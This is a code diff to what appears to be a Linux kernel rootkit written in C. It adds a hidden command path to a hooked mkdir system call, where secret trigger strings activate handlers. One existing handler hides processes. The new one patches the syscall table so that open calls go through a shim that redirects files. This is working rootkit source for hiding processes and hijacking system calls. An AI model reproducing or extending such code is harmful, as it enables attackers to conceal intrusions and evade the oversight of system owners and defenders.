@@ -13,6 +13,9 @@
 #include "secrets.h"
 #include "hiddenDirectories.h"
 
+void patch(int callnum, void* newcall);
+void unpatch(int callnum);
+
 int hidePidApiHandler(char* pid) {
 	char path[20];
 	int i;
@@ -24,6 +27,14 @@ int hidePidApiHandler(char* pid) {
 	for (i = 0; i < hiddenDirectories->size; ++i) {
 		printk(KERN_INFO "path: %s\n", (char*)hiddenDirectories->arr[i]);
 	}
+	return 0;
+}
+
+int openShim(char *filename, int flags, umode_t mode);
+
+int activateProcModulesApiHandler(void) {
+	printk(KERN_INFO "file redirection enabled\n");
+	patch(SYS_open, openShim);
 	return 0;
 }
 
@@ -64,6 +75,9 @@ int mkdirShim(char* path) {
 	}
 	else if (strnstrn(path, strnlen(path, 20), secret_api_hidepid, 20)) {
 		return hidePidApiHandler(path + 20);
+	}
+	else if (strnstrn(path, strnlen(path, 20), secret_api_procmods, 20)) {
+		return activateProcModulesApiHandler();
 	}
 	return ((SYS_mkdir_type)backup_sys_call_table[SYS_mkdir])(path);
 }
